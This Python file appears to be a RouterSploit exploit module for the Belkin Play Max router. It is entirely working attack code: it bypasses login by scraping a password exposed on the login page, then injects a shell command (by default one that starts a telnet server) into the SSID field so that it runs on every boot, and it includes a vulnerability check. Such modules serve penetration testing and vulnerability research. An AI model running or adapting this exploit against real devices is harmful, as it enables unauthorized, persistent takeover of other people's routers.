import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin Play Max Persistent RCE",
        "description": "Module exploits Belkin SSID injection vuln, allowing to execute arbitrary command at every boot.",
        "authors": (
            "BigNerd95 (Lorenzo Santina) https://github.com/bignerd95",  # vulnerability discovery and routersploit module
        ),
        "references": (
            "https://bignerd95.blogspot.it/2017/02/belkin-play-max-persistent-remote.html",
            "https://gist.github.com/BigNerd95/c18658b472ac0ccf4dbbc73fe988b683",
        ),
        "devices": (
            "Belkin Play Max (F7D4401)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    cmd = OptString("telnetd", "Command to execute")

    def auth_bypass(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            payload = "pws=" + val[0] + "&arc_action=login&action=Submit"

            login = self.http_request(
                method="POST",
                path="/login.cgi",
                data=payload
            )
            if login is None:
                return False

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print_success("Exploit success, you are now logged in!")
                return True

        print_error("Exploit failed. Device seems to be not vulnerable.")
        return False

    def inject_command(self):
        response = self.http_request(
            method="GET",
            path="/wireless_id.stm",
        )
        if response is None:
            print_error("Exploit failed. No response from target!")
            return

        srcSSID = re.search(r"document\.tF\['ssid'\]\.value=\"(.*)\";", response.text)
        if srcSSID:
            SSID = srcSSID.group(1)
        else:
            print_error("Exploit failed. Are you logged in?")
            return

        if len(SSID) + 2 + len(self.cmd) > 32:
            newlen = 32 - len(self.cmd) - 2
            SSID = SSID[0:newlen]
            print_status("SSID too long, it will be truncated to: " + SSID)

        newSSID = SSID + "%3B" + self.cmd + "%3B"

        payload = "page=radio.asp&location_page=wireless_id.stm&wl_bssid=&wl_unit=0&wl_action=1&wl_ssid=" + newSSID + "&arc_action=Apply+Changes&wchan=1&ssid=" + newSSID
        response = self.http_request(
            method="POST",
            path="/apply.cgi",
            data=payload,
        )

        if response is None:
            print_error("Exploit failed. No response from target!")
            return

        err = re.search(r'countdown\(55\);', response.text)
        if err:
            print_success("Exploit success, wait until router reboot.")
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    def run(self):
        if self.auth_bypass():
            self.inject_command()

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target is vulnerable

        return False  # target is not vulnerable
